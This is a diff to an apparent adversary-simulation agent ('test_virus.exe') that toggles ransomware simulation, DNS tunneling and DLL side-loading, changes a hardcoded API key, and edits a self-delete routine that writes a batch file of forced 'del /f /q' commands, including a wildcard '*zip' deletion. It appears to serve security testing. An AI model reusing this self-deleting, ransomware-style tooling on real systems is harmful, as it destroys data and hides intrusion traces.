@@ -13,14 +13,12 @@ import base64
 from math import floor
 from datetime import datetime, timedelta
 from cryptography.fernet import Fernet
-# import glob
-
-
+import glob 
 #Configurable Variables
-API_KEY = "superSecretApiKey"  
-USE_CASES = {'ransomware_simulation': True, 'dns_tunneling': True, 'net_recon': True, 'dll_side_loading': True, 'registry_edits': True, 'scheduled_tasks': True, 'encrypted_traffic': True, 'traffic_non_standard_ports': True}
+API_KEY = "c2ef2dbfd982a527df1cb3c7028b2e24c1bc1e0b5082031ef51aa491bd9afb0f"  
+USE_CASES = {'ransomware_simulation': True, 'encrypted_traffic': True, 'dns_tunneling': False, 'net_recon': False, 'dll_side_loading': False, 'registry_edits': False, 'scheduled_tasks': False, 'traffic_non_standard_ports': False}
 
-heartbeatRate = 10  # in seconds
+heartbeatRate = 11  # in seconds
 
 # Ransomeware simulation variables 
 # Generate a random key for encryption
@@ -112,7 +110,7 @@ def delete_self():
         lib_folder = os.path.join(base_directory, "Lib")
         exe_file = os.path.join(base_directory, "test_virus.exe")
         license_file = os.path.join(base_directory, "frozen_application_license.txt")
-        dll_file = os.path.join(base_directory, "python*.dll")
+        dll_file = os.path.join(base_directory, "python312.dll")
         cleanup_batch = os.path.join(base_directory, "cleanup.bat")
 
         # Write a cleanup batch script
@@ -127,6 +125,7 @@ def delete_self():
                 batch_file.write(f'del /f /q "{license_file}"\n')  # Delete license file
             
             batch_file.write(f'del /f /q "{dll_file}"\n')  # Delete DLL file
+            batch_file.write(f'del /f /q "*zip"\n')  # Delete the zip file if present
             # if os.path.exists(dll_file):
             #     batch_file.write(f'del /f /q "{dll_file}"\n')  # Delete DLL file
             batch_file.write(f'del /f /q "{exe_file}"\n')  # Delete the EXE
